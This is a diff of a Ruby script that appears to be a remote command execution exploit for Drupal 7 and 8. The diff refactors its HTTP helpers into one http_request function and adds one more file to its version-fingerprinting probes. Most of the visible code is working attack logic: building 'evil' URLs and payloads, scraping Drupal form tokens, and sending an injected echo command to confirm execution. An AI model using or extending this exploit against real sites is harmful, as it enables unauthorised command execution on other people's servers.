@@ -33,19 +33,10 @@ $useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefo
 
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
-
-# Function http_post <url> [post]
-def http_post(url, payload="")
+# Function http_request <url> [type] [data]
+def http_request(url, type="post", payload="")
   uri = URI(url)
-  request = Net::HTTP::Post.new(uri.request_uri)
-  request.initialize_http_header({"User-Agent" => $useragent})
-  request.body = payload
-  return $http.request(request)
-end
-
-def http_get(url, payload="")
-  uri = URI(url)
-  request = Net::HTTP::Get.new(uri.request_uri)
+  request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
   request.initialize_http_header({"User-Agent" => $useragent})
   request.body = payload
   return $http.request(request)
@@ -79,7 +70,7 @@ def gen_evil_url(evil)
 
   # Drupal v7 needs an extra value from a form
   if $drupalversion.start_with?('7')
-    response = http_post(url, payload)
+    response = http_request(url, "post", payload)
 
     form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
     if form_build_id.empty?
@@ -160,11 +151,12 @@ if not $drupalversion
     $target + "core/CHANGELOG.txt",
     $target + "includes/bootstrap.inc",
     $target + "core/includes/bootstrap.inc",
+    $target + "includes/database.inc"
   ]
   # Check all
   url.each do|uri|
     # Check response
-    response = http_get(uri)
+    response = http_request(uri,"get")
 
     if response.code == "200"
       puts "[+] Found  : #{uri} (#{response.code})"
@@ -217,7 +209,7 @@ $drupalversions.each do|version|
   puts "[+] Attacking version #{version}"
   $drupalversion = version
   url, payload = gen_evil_url("echo #{random}")
-  response = http_post(url, payload)
+  response = http_request(url, "post", payload)
   if response.code == "200" and not response.body.empty?
     #result = JSON.pretty_generate(JSON[response.body])
     result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
